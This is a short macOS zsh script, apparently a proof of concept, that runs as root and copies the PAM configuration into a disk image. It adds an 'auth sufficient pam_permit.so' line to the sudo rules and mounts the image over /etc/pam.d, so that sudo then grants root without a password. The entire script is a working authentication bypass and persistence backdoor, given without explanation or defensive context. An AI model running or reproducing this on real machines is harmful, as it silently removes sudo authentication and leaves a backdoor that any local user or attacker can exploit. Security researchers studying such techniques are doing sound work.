#!/bin/zsh

# Make sure only root can run our script
if [ "$(id -u)" != "0" ]; then
   echo "[-] Error: This script must be run as root"
   exit 1
fi

echo "[i] create a disk image"
hdiutil create /tmp/tmp.dmg -size 2m -volname "bypass" -fs APFS
hdiutil attach /tmp/tmp.dmg

echo "[i] copy pam config files to our disk image"
cp /etc/pam.d/* /Volumes/bypass 

echo "[i] add write permission to the files we want to edit"
chmod +w /Volumes/bypass/sudo

echo "[i] add rule to sudo"
echo -e "auth       sufficient     pam_permit.so\n$(cat /Volumes/bypass/sudo)" > /Volumes/bypass/sudo

echo "[i] unmount"
hdiutil detach /Volumes/bypass

echo "[i] mount over pam.d"
hdiutil attach -mountpoint /etc/pam.d -owners on /tmp/tmp.dmg